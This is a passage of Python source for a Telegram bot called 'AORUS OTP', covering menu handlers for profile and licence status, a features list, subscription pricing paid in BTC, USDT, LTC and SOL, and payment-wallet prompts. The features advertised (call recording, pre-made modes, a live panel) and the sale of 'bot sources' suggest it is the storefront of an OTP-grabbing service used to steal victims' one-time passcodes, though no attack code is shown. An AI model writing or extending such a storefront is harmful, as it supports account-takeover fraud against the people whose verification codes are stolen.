                    [
                    InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                InlineKeyboardButton(text="📃 Vouches Channel", url=vouches_link)
                    ],
                    [
                        InlineKeyboardButton(text="✅ I've subscribed.", callback_data="check_subchannel")
                    ]
                ]
                )
            await callback.message.delete()
            await callback.message.answer("⚠ You have to subscribe on our channels first to use this command.",parse_mode='MarkdownV2',reply_markup=keyboard)

#PROFILE
@dp.callback_query(F.data.in_(["profile"])) #DONE
async def check_profile(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        if callback.from_user.username:
            username = "@"+callback.from_user.username
        else:
            username='None'
        if get_user_info(user_id,'date')=='N/A' and not (get_user_info(user_id,'trial')):
            status = 'No Active Licence detected.'
        elif get_user_info(user_id,'date')!='N/A':
                now = datetime.now()
                expire_date = datetime.strptime(get_user_info(user_id,'date'), "%Y-%m-%d %H:%M:%S.%f")
                if now > expire_date:
                    status = 'No Active Licence detected.'
                else:
                    status = 'Active Licence detected.'
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""👤 *My Profile*

ℹ️ My informations\:
  • My ID\: `"""+str(user_id)+"""`
  • My Name\: `"""+escape_markdown(get_user_info(user_id,'first_name'))+"""`
  • My Username\: """+escape_markdown(username)+"""
  • Subscription Status\: """+escape_markdown(status),parse_mode='MarkdownV2',reply_markup=keyboard)


#FEATURES
@dp.callback_query(F.data.in_(["Features"])) #DONE
async def features(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💲 Pricing", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await callback.message.delete()
        image = FSInputFile("img.jpg")  # Path to your local file
        await callback.message.answer_photo(image, caption="""💥 *AORUS OTP* has many UNIQUE features that you can't find in any other bot\.

🎯 Features included\:
  🔸 24/7 Support
  🔸 Automated Payment System
  🔸 Live Panel Feeling
  🔸 12\+ Pre\-made Modes
  🔸 99\.99% Up\-time
  🔸 Call Recording""",parse_mode='MarkdownV2',reply_markup=keyboard)


#COMMUNITY
@dp.callback_query(F.data.in_(["community"])) #DONE
async def community(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📢 Main Channel", url=main_channel_link),
                InlineKeyboardButton(text="✅ Vouches Channel", url=vouches_link)
            ],
            [
                InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await callback.message.delete()
        image = FSInputFile("img.jpg")  # Path to your local file
        await callback.message.answer_photo(image, caption="""Welcome to *AORUS OTP*\! 🚀 
Stay connected with our Telegram channels for the latest updates\, exclusive features\, and real\-time support\. 
Whether you're here for fast OTP services or want to stay informed about new tools and improvements\, our channels have you covered\.
Join us and be part of the growing *AORUS OTP community*\!""",parse_mode='MarkdownV2',reply_markup=keyboard)
        

#PRICES
@dp.callback_query(F.data.in_(["Purchase"])) #DONE
async def pricing(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="💲 USDT", callback_data="usdt"),
                InlineKeyboardButton(text="₿ BTC", callback_data="btc")
            ],
            [
                InlineKeyboardButton(text="𝑳 LTC", callback_data="ltc"),
                InlineKeyboardButton(text="◎ SOL", callback_data="sol")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""💸 Choose your subscription plan and send it to one of the following wallets bellow\:
                                     
  • 1 Hour Plan   ➜ *10$ \(trial mode\)*                                                                   
  • 1 Day plan    ➜ *25$*
  • 3 Days plan   ➜ *40$*
  • 1 Week plan   ➜ *80$*
  • 1 Month plan  ➜ *220$*
  • 3 Months plan ➜ *480$*
  • Premium plan ➜ *45$ \(2 days \+ bot sources\)*""",parse_mode='MarkdownV2',reply_markup=keyboard)

#BTC
@dp.callback_query(F.data.in_(["btc"])) #DONE
async def btc_wallet(callback: CallbackQuery):
    user_id=callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*Bitcoin \(BTC\)*
                                    
• `"""+btc+"""`""",parse_mode='MarkdownV2', reply_markup=keyboard)
   

#USDT
@dp.callback_query(F.data.in_(["usdt"])) #DONE
async def usdt_wallet(callback: CallbackQuery):
    user_id = callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*USDT \(TRC20\)*
                                    
• `"""+usdt+"""`""",parse_mode='MarkdownV2', reply_markup=keyboard)
        

#SOL
@dp.callback_query(F.data.in_(["sol"])) #DONE
async def sol_wallet(callback: CallbackQuery):
    user_id=callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*Solana \(SOL\)*
                                  
• `"""+sol+"""`""",parse_mode='MarkdownV2', reply_markup=keyboard)


#LTC
@dp.callback_query(F.data.in_(["ltc"])) #DONE
async def ltc_wallet(callback: CallbackQuery):
    user_id=callback.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="🆘 Support", url=admin_link)
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO PRICING MENU", callback_data="Purchase")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*Litecoin \(LTC\)*
                                  
• `"""+ltc+"""`""",parse_mode='MarkdownV2', reply_markup=keyboard)


#NON AVAILABLE COMMAND
@dp.message(lambda message: message.text and message.text.startswith('/'))
async def unknown_command(message: Message):
    user_id=message.from_user.id
    if not(get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url=admin_link)
                ]])
        await message.answer("⚠️ Unrecognized command. Please contact support if you need assistance.",reply_markup=keyboard)


#TEXT 
@dp.message()
async def unknown_text(message: Message):
    user_id = message.from_user.id
    if not (get_user_info(user_id,'banned')):
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url=admin_link)
                ]])
        await message.answer("🤖 Sorry I didn't understand that. Please contact the support for any question.",reply_markup=keyboard)


# Run bot
async def main():
    create_users_table()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
